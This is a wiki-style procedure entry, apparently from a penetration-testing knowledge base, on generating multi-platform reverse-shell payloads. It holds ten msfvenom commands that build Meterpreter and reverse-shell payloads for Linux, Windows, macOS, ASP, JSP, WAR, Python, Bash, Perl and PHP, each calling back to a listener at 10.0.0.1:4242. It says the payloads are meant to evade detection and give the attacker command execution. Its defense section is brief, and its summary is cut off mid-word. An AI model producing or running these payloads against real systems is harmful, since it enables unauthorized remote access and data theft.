---
id: 056db8af-2511-4782-afca-953c04695f33
name: Multi-Platform Reverse Shell Payload
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.941538+00:00'
updated_at: '2023-04-10T20:25:33.085971+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Scripting|T1064 - Scripting]]'
- '[[Standard Application Layer Protocol|T1071 - Standard Application Layer Protocol]]'
tags:
- '[[Meterpreter Shell]]'
- '[[Other platforms]]'
- '[[Reverse Shell Cheat Sheet]]'
commands:
- '[[Generate ASP Meterpreter Payload]]'
- '[[Generate Bash Reverse Shell Payload]]'
- '[[Generate Java JSP Reverse Shell Payload]]'
- '[[Generate Java WAR Reverse Shell Payload]]'
- '[[Generate Linux Meterpreter Payload]]'
- '[[Generate OSX Reverse Shell Payload]]'
- '[[Generate Perl Reverse Shell Payload]]'
- '[[Generate PHP Meterpreter Payload]]'
- '[[Generate Python Reverse Shell Payload]]'
- '[[Generate Windows Meterpreter Payload]]'
---

# Multi-Platform Reverse Shell Payload

## Summary

The Multi-Platform Reverse Shell Payload procedure is a tool used to generate a reverse shell payload that can be used on various platforms. This tool is useful for penetration testers who want to gain remote access to a target system. The payload can be customized to fit the needs of the tester an

## Description

# Description

The Multi-Platform Reverse Shell Payload procedure is a tool used to generate a reverse shell payload that can be used on various platforms. This tool is useful for penetration testers who want to gain remote access to a target system. The payload can be customized to fit the needs of the tester and can be used to execute arbitrary commands on the target system. This procedure can be used to test the effectiveness of a target's security measures and to identify vulnerabilities that can be exploited by an attacker.

The technical explanation of this procedure is that it generates a payload that establishes a reverse shell connection with the attacker's machine. The payload is designed to bypass security measures and establish a connection with the attacker's machine without being detected. Once the connection is established, the attacker can execute commands on the target system and gain access to sensitive information.

The business value of this procedure is that it allows organizations to identify vulnerabilities in their security measures and take appropriate measures to protect their systems from attackers.

## Requirements

1. Access to the target system

1. Knowledge of the target system's platform

## Defense

1. Use network segmentation to isolate critical systems from the internet

1. Implement strict access control policies to limit access to sensitive systems and data

1. Monitor network traffic for suspicious activity and anomalies

## Objectives

1. Generate a reverse shell payload for various platforms

1. Establish a remote connection with a target system

1. Execute arbitrary commands on the target system

# Instructions

1. Use the msfvenom tool to generate multiple payloads for different platforms using different formats.

**Code**: [[$ msfvenom -p linux/x86/meterpreter/reverse_tcp LH]]

> The msfvenom tool is used to generate payloads for various platforms. This command generates payloads for Linux, Windows, OSX, Java, and PHP. The payloads are generated with different formats such as ELF, EXE, Mach-O, ASP, JSP, WAR, Python, Bash, Perl, and PHP. The LHOST and LPORT arguments are used to specify the IP address and port number of the listener. The generated payload is saved in a file with the specified format. The last command copies the PHP payload to the clipboard, creates a new PHP file, and pastes the copied content to the new file. This command can be used to generate payloads for different platforms and formats for testing and exploitation purposes.

**Command** ([[Generate Linux Meterpreter Payload]]):

```bash
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f elf > shell.elf
```

**Command** ([[Generate Windows Meterpreter Payload]]):

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f exe > shell.exe
```

**Command** ([[Generate OSX Reverse Shell Payload]]):

```bash
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho > shell.macho
```

**Command** ([[Generate ASP Meterpreter Payload]]):

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp > shell.asp
```

**Command** ([[Generate Java JSP Reverse Shell Payload]]):

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.jsp
```

**Command** ([[Generate Java WAR Reverse Shell Payload]]):

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > shell.war
```

**Command** ([[Generate Python Reverse Shell Payload]]):

```bash
$ msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py
```

**Command** ([[Generate Bash Reverse Shell Payload]]):

```bash
$ msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh
```

**Command** ([[Generate Perl Reverse Shell Payload]]):

```bash
$ msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl
```

**Command** ([[Generate PHP Meterpreter Payload]]):

```bash
$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Scripting|T1064 - Scripting]]
- [[Standard Application Layer Protocol|T1071 - Standard Application Layer Protocol]]

## Commands Used

- [[Generate ASP Meterpreter Payload]]
- [[Generate Bash Reverse Shell Payload]]
- [[Generate Java JSP Reverse Shell Payload]]
- [[Generate Java WAR Reverse Shell Payload]]
- [[Generate Linux Meterpreter Payload]]
- [[Generate OSX Reverse Shell Payload]]
- [[Generate Perl Reverse Shell Payload]]
- [[Generate PHP Meterpreter Payload]]
- [[Generate Python Reverse Shell Payload]]
- [[Generate Windows Meterpreter Payload]]

## Tags

- [[Meterpreter Shell]]
- [[Other platforms]]
- [[Reverse Shell Cheat Sheet]]
